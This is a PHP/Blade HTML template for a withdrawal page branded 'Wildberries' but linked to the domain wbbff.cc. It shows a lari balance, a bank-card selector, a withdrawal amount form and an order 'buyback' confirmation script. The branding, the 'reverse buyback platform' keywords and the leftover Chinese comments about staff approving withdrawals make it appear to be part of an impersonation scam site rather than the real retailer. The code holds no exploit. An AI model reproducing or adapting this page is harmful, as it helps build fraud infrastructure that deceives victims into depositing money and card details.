<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina">

<head>
	<style>
		:root {

			--image-path: url('<?php echo asset("/assets/foot_nav.png") ?>');
			--image-path2: url('<?php echo asset("/assets/dd_icon.png") ?>');
		}
	</style>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
	<title>Вывод средств - Wildberries</title>
	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
	<meta name="format-detection" content="telephone=no">
	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/arttpl.js") ?>"></script>
	<link href="<?php echo asset("assets/layer.css") ?>" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body>
	<div class="pagetop">
		<div class="fh"><a href="javascript:history.back(-1)"></a></div>
		<div>Вывод средств</div>

		<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> -->
	</div>








	<div class="pagetop">


		<form method="post" id="form">
			@csrf
			<table width="100%" border="0" cellspacing="0" cellpadding="0">
				<tbody>
					<tr>
						<td style="text-align:right;" width="150">баланс：</td>
						<td style="text-align:left;">
							<span class="corg">{{ Auth::user()->balance }} ₾.</span>
						</td>
					</tr>
					<tr>
						<td style="text-align:right;">Банк：</td>
						<td style="text-align:left;">
							<select name="userbank_id" class="inputselect">
								@foreach($payments as $payment)
								<option value="{{ $payment->id }}" {{ $loop->first ? 'selected' : '' }}>
									{{ $payment->name }} ({{ substr($payment->card, 0, 4) }}**{{ substr($payment->card, -4) }})
								</option>
								@endforeach
							</select>
							<span id="userbank_id_show"></span>
						</td>
					</tr>
					<tr>
						<td style="text-align:right;">сумма вывода：</td>
						<td style="text-align:left;">
							<input type="text" name="cashout_money" value="0.0" class="inputall input100" autocomplete="off"> ₾
							<span id="cashout_money_show" class="mal10"></span>
						</td>
					</tr>
					<!-- 		<tr>
			<td style="text-align:right;">гонорар：</td>
			<td><span id="cashout_fee">0</span> GEL</td>
		</tr> -->




				</tbody>
			</table>
			<div class="loginbtn" style="margin:15px;">

				<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
				<input type="hidden" name="pesubmit">
				<input type="button" value="снятие" class="tjbtn">


			</div>
		</form>

		<!-- <div class="tixing c888" style="margin-top:70px"><p class="cred mab10">温馨提示：</p>单笔500GEL起可以提现，每笔扣除0%的手续费<p class="cred mab10">提交后请等待客服审核，审核通过后自动到账</p></div> -->

	</div>

	<div class="clear"></div>

	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
	<!-- <script type="text/javascript" src="https://wbbff.cc/public/jsindex/arttpl.js"></script>
<script type="text/javascript" src="https://wbbff.cc/public/plugin/layer/layer.js"></script>
<script type="text/javascript" src="https://wbbff.cc/public/jsindex/global.js"></script> -->
	<script type="text/javascript" src="<?php echo asset("assets/formcheck.js") ?>"></script>
	<script type="text/javascript">
		$(function() {
			if (1 == 0) {
				pe_alert("Пожалуйста, сначала добавьте платежный аккаунт", function() {
					pe_open('user.php?mod=userbank&act=add&fromto=https%3A%2F%2Fwbbff.cc%2Fuser.php%3Fmod%3Dcashout%26act%3Dadd');
				});
			}
			$(":input[name='cashout_money']").bind('keyup blur', function() {
				var cashout_money = pe_num($(this).val(), 'round', 1);
				var cashout_fee = pe_num(cashout_money * 0, 'round', 1);
				$("#cashout_fee").html(cashout_fee);
			})
			$(":button").click(function() {
				var cashout_money = pe_num($(":input[name='cashout_money']").val(), 'float', 1);
				if (cashout_money <= 0) {
					app_tip("Введите сумма вывода", 'error');
					return false;
				}
				app_submit("{{ route('cashouts.store') }}", function(json) {

					if (json.result) {
						pe_open("{{ route('profile') }}", 1000);
					} else {
						pe_tip(json.show);
					}
				})
			})
		})
	</script>
	<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css") ?>">
	<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css") ?>">
	<script src="<?php echo asset("assets/jquery-weui.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
	<script type="text/javascript">
		//顶部菜单点击
		function top_menu() {
			if ($("#top_menu").is(":hidden")) {
				$("#top_menu").show();
			} else {
				$("#top_menu").hide();
			}
			$("#top_menu a").live("click", function() {
				$("#top_menu").hide();
			})
		}
		pe_loadscript("https://wbbff.cc/api.php?mod=cron");
	</script>
	<script>
		function confirm_huigou(order_id) {
			layer.open({
				content: "Определить выкуп этого Заказ？",
				btn: ["OK", "Отмена"],
				shadeClose: false,
				yes: function() {

					/*layer.open({
						content: '你点了确认',
						time: 1
					});*/
					$.ajax({
						type: "POST",
						url: "./user.php?mod=order&act=huigou_do",
						dataType: "json",
						data: {
							'order_id': order_id,
						},
						success: function(res) {
							console.log(res);

							if (res.result == false) {
								layer.open({
									content: res.msg,
									time: 3,
									skin: 'msg',
									end: function() {
										location.href = './user.php?mod=userbank';
									}
								});
							} else {
								layer.open({
									content: res.msg,
									time: 2,
									skin: 'msg',
									end: function() {
										location.reload();
									}
								});
							}
						}
					});
				}

			});
		}
	</script>

</body>

</html>